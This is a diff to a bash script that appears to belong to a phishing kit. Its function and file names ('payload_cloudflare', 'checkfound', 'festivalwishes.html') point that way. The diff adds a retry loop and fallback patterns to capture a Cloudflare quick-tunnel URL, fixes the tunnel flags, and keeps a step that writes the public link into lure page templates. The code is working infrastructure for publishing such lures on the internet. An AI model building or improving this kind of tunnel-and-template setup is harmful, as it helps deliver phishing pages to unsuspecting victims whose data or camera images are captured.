@@ -260,27 +260,50 @@ fi
 fi
 
 printf "\e[1;92m[\e[0m+\e[1;92m] Starting php server...\n"
-php -S 127.0.0.1:3333 > /dev/null 2>&1 & 
+php -S 127.0.0.1:3333 > /dev/null 2>&1 &
 sleep 2
+
 printf "\e[1;92m[\e[0m+\e[1;92m] Starting cloudflared tunnel...\n"
-rm -rf .cloudflared.log > /dev/null 2>&1 &
+rm -f .cloudflared.log > /dev/null 2>&1
 
 if [[ "$windows_mode" == true ]]; then
-    ./cloudflared.exe tunnel -url 127.0.0.1:3333 --logfile .cloudflared.log > /dev/null 2>&1 &
+    ./cloudflared.exe tunnel --url http://127.0.0.1:3333 --logfile .cloudflared.log > /dev/null 2>&1 &
 else
-    ./cloudflared tunnel -url 127.0.0.1:3333 --logfile .cloudflared.log > /dev/null 2>&1 &
+    ./cloudflared tunnel --url http://127.0.0.1:3333 --logfile .cloudflared.log > /dev/null 2>&1 &
 fi
 
-sleep 10
-link=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' ".cloudflared.log")
+# --- Retry loop: wait up to 60 seconds for the tunnel URL (important for slow Android/Termux) ---
+link=""
+max_wait=60
+waited=0
+printf "\e[1;92m[\e[0m*\e[1;92m] Waiting for tunnel URL"
+while [[ -z "$link" && $waited -lt $max_wait ]]; do
+    sleep 2
+    waited=$((waited + 2))
+    printf "."
+    if [[ -e ".cloudflared.log" ]]; then
+        # Try both URL formats cloudflare uses (trycloudflare.com)
+        link=$(grep -o 'https://[-0-9a-zA-Z]*\.trycloudflare\.com' ".cloudflared.log" | head -n1)
+        # Fallback: some versions print the URL differently
+        if [[ -z "$link" ]]; then
+            link=$(grep -oE 'https://[a-zA-Z0-9-]+\.trycloudflare\.com' ".cloudflared.log" | head -n1)
+        fi
+        # Fallback: grep the raw log for any https tunnel URL
+        if [[ -z "$link" ]]; then
+            link=$(grep -oE 'https://[^ "]+trycloudflare[^ "]+' ".cloudflared.log" | head -n1)
+        fi
+    fi
+done
+printf "\n"
+
 if [[ -z "$link" ]]; then
 printf "\e[1;31m[!] Direct link is not generating, check following possible reason  \e[0m\n"
 printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m CloudFlare tunnel service might be down\n"
 printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m If you are using android, turn hotspot on\n"
-printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m CloudFlared is already running, run this command killall cloudflared\n"
+printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m CloudFlared is already running, run: killall cloudflared\n"
 printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m Check your internet connection\n"
-printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m Try running: ./cloudflared tunnel --url 127.0.0.1:3333 to see specific errors\n"
-printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m On Windows, try running: cloudflared.exe tunnel --url 127.0.0.1:3333\n"
+printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m Try running: ./cloudflared tunnel --url http://127.0.0.1:3333\n"
+printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m Check log: cat .cloudflared.log\n"
 exit 1
 else
 printf "\e[1;92m[\e[0m*\e[1;92m] Direct link:\e[0m\e[1;77m %s\e[0m\n" $link
@@ -290,7 +313,7 @@ checkfound
 }
 
 payload_cloudflare() {
-link=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' ".cloudflared.log")
+link=$(grep -oE 'https://[a-zA-Z0-9-]+\.trycloudflare\.com' ".cloudflared.log" | head -n1)
 sed 's+forwarding_link+'$link'+g' template.php > index.php
 if [[ $option_tem -eq 1 ]]; then
 sed 's+forwarding_link+'$link'+g' festivalwishes.html > index3.html
